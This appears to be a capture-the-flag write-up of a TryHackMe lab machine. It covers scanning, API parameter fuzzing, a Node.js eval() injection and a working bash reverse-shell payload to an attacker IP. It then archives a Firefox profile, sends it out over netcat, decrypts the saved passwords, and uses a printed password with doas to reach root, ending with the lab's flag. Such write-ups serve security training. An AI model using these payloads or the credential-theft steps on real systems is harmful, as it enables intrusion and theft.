![[Pasted image 20251023210020.png]]start from fast portscan with nmap
```shell
nmap -A -T4 <machineIP>
```
results:
```shell
Nmap scan report for 10.10.141.67
Host is up (0.12s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   114.41 ms 10.11.0.1
2   114.68 ms 10.10.141.67

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.69 seconds
```
open only 80 port, open in browser and check
![[Pasted image 20251023210326.png]]
on the page nothing
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
```
but html have script which no where used, check DevTools
![[Pasted image 20251023210708.png]]
cookie with value, but need to vind value try to start `getAccess()` in console![[Pasted image 20251023210817.png]]
its give a token tin base64, decode and after paste in cookie value
Decoded: `this_is_not_real`
![[Pasted image 20251023211007.png]]
now we open a real site lets check html
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>sad.</title>

    <link rel="stylesheet" href="[style.css](view-source:http://10.10.141.67/style.css)" />
  </head>
  <body>
    <header>
      <div id="left">
        <h1>
          how<br />
          to<br />
          disappear<br />
          completely<br />
          and never<br />
          <span id="found-text">be found</span><br />
          again
        </h1>
        <img src="[./img/rose.jpg](view-source:http://10.10.141.67/img/rose.jpg)" alt="glitch-rose" id="glitch-rose" />
      </div>
      <div id="right">
        <h3 class="red-line">this is about you</h3>
        <h3 class="right-text blur-1">i can't go back there</h3>
        <h3 class="right-text blur-2">i can't go back there</h3>
        <h3 class="right-text blur-3">i can't go back there</h3>
        <h3 class="right-text blur-4">i can't go back there</h3>
        <h3 class="right-text blur-5">i can't go back there</h3>
        <h3 class="right-text blur-6">i can't go back there</h3>
        <h3 class="right-text blur-7">i can't go back there</h3>
      </div>
    </header>

    <div id="little-sec">
      <h3>IT TAKES A MONSTER TO DESTROY A MONSTER</h3>
    </div>

    <section>
      <div id="buttons">
        <a class="btn">all</a>
        <a class="btn">sins</a>
        <a class="btn">errors</a>
        <a class="btn">deaths</a>
      </div>
      <div id="items"></div>
    </section>

    <section id="watching">
      <div class="overlay">
        <h3>sad.</h3>
      </div>
    </section>

    <section id="click-here-sec">
      <a href="[#](view-source:http://10.10.141.67/#)">click me.</a>
    </section>

    <script src="[js/script.js](view-source:http://10.10.141.67/js/script.js)"></script>
  </body>
</html>
```
cant find something intreresting, on site and in HTML start feroxbuster
```shell
feroxbuster -u http://10.10.141.67/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,zip,tar,conf,inc -t 200 -s 200,204,301,302,403,304,303,500,501,502 -H "Cookie:this_is_not_real" 
```
results:
```shell
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.141.67/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 403, 304, 303, 500, 501, 502]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ Cookie: this_is_not_real
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip, tar, conf, inc]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET       10l       16w      173c http://10.10.141.67/img => http://10.10.141.67/img/
200      GET        1l        1w       36c http://10.10.141.67/api/access
200      GET      387l     2378w   181068c http://10.10.141.67/img/glitch.jpg
200      GET       32l       59w      724c http://10.10.141.67/
301      GET       10l       16w      171c http://10.10.141.67/js => http://10.10.141.67/js/
200      GET       32l       59w      724c http://10.10.141.67/secret
200      GET       32l       59w      724c http://10.10.141.67/Secret
[####################] - 33m  5954787/5954787 0s      found:7       errors:2620   
[####################] - 33m  1984905/1984905 1011/s  http://10.10.141.67/ 
[####################] - 33m  1984905/1984905 1010/s  http://10.10.141.67/img/ 
[####################] - 33m  1984905/1984905 1011/s  http://10.10.141.67/js/        
```

check /secret:
![[Pasted image 20251023211633.png]]
predictable
after i checked Network and find new endpoint: 
![[Pasted image 20251023212346.png]]
![[Pasted image 20251023212449.png]]
check metod from api endpoint can do, 
![[Pasted image 20251023212645.png]]
POST, we can download something, use ffuf to check what we can
```shell
ffuf -u "http://10.10.141.67/api/items?FUZZ=id"  -t 200 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -X POST -ac
```
results:
```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.141.67/api/items?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/objects.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cmd                     [Status: 500, Size: 1079, Words: 55, Lines: 11, Duration: 217ms]
:: Progress: [3132/3132] :: Job [1/1] :: 466 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```
cmd - we can try command for this cmd
```shell
ffuf -u "http://10.10.141.67/api/items?cmd=FUZZ"  -t 200 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt  -X POST -ac --mc 200
```
result:
```shell
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.141.67/api/items?cmd=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/objects.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200
________________________________________________

.htaccessaBrbsyVx       [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 173ms]
02                      [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 172ms]
2006                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 172ms]
00                      [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 172ms]
01                      [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 173ms]
03                      [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 175ms]
2001                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 175ms]
30                      [Status: 200, Size: 26, Words: 2, Lines: 1, Duration: 175ms]
3                       [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 175ms]
2007                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 175ms]
300                     [Status: 200, Size: 27, Words: 2, Lines: 1, Duration: 175ms]
2003                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 175ms]
20                      [Status: 200, Size: 26, Words: 2, Lines: 1, Duration: 175ms]
200                     [Status: 200, Size: 27, Words: 2, Lines: 1, Duration: 175ms]
101                     [Status: 200, Size: 27, Words: 2, Lines: 1, Duration: 176ms]
2005                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 176ms]
2000                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 177ms]
10                      [Status: 200, Size: 26, Words: 2, Lines: 1, Duration: 197ms]
100                     [Status: 200, Size: 27, Words: 2, Lines: 1, Duration: 197ms]
1000                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 197ms]
1                       [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 198ms]
102                     [Status: 200, Size: 27, Words: 2, Lines: 1, Duration: 199ms]
1998                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 200ms]
1999                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 200ms]
103                     [Status: 200, Size: 27, Words: 2, Lines: 1, Duration: 203ms]
2004                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 530ms]
2002                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 530ms]
2                       [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 531ms]
console                 [Status: 200, Size: 39, Words: 3, Lines: 1, Duration: 196ms]
data                    [Status: 200, Size: 39, Words: 3, Lines: 1, Duration: 182ms]
global                  [Status: 200, Size: 39, Words: 3, Lines: 1, Duration: 183ms]
JSON                    [Status: 200, Size: 37, Words: 3, Lines: 1, Duration: 165ms]
Map                     [Status: 200, Size: 56, Words: 7, Lines: 1, Duration: 152ms]
module                  [Status: 200, Size: 39, Words: 3, Lines: 1, Duration: 152ms]
null                    [Status: 200, Size: 28, Words: 2, Lines: 1, Duration: 153ms]
process                 [Status: 200, Size: 40, Words: 3, Lines: 1, Duration: 191ms]
root                    [Status: 200, Size: 39, Words: 3, Lines: 1, Duration: 224ms]
router                  [Status: 200, Size: 96, Words: 14, Lines: 3, Duration: 225ms]
Set                     [Status: 200, Size: 56, Words: 7, Lines: 1, Duration: 182ms]
:: Progress: [3132/3132] :: Job [1/1] :: 444 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```
![[Pasted image 20251023214912.png]]
in caido we can see more, `vulnerability_exploited [object global]` ask chatgpt and its Node.js + Express and eval() we have JavaScript RCE on server, lets take a shell with Node.js
use this encoded with URL command in cmd
```shell
require('child_process').execSync('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')
```
```base64
require%28%27child_process%27%29.execSync%28%27bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.11.147.65%2F9001+0%3E%261%22%27%29
```
and we are here ![[Pasted image 20251023233438.png]]
take our user flag
![[Pasted image 20251023233519.png]]
next step use `linpeas.sh`
and find  ![[Pasted image 20251023234150.png]]
lets check script conf
```shell
user@ubuntu:/tmp$ cat /usr/local/etc/doas.conf
cat /usr/local/etc/doas.conf
permit v0id as root
```
in conf we see what we must be a `v0id` to exec root script and be root,
afer i find .firefox in /home/user and i think that in this dir i can find dump of firefox lets download a `firefox_decrupt.py`
```shell
git clone https://github.com/unode/firefox_decrypt.git
```
after archive our .firefox and send by netcat
on target:
```shell
tar -cvf fr.tgz .firefox
```
on kali:
```shell
nc -lvnp <port> > fr.tgz
```
on target:
```shell
nc IP port , fr.tgz
```
on kali 
```shell
tar -xzf fr.tgz -c <path to extract>
```
and use our script
```shell
python3 /home/user/firefox_decrypt/firefox_decrypt.py  ./.firefox/b5w4643p.default-release
```
result
```shell
025-10-23 18:03:23,356 - WARNING - profile.ini not found in ./.firefox/b5w4643p.default-release
2025-10-23 18:03:23,356 - WARNING - Continuing and assuming './.firefox/b5w4643p.default-release' is a profile location

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```
use
```shell
user@ubuntu:~$ su v0id
su v0id
Password: love_the_void
v0id@ubuntu:/home/user$ whoami
whoami
v0id
```
and take a root 
```shell
bash: -c: option requires an argument
v0id@ubuntu:/home/user$ doas -u root bash -p
doas -u root bash -p
Password: love_the_void

root@ubuntu:/home/user# cat /root/root.txt
cat /root/root.txt
THM{diamonds_break_our_aching_minds}

```





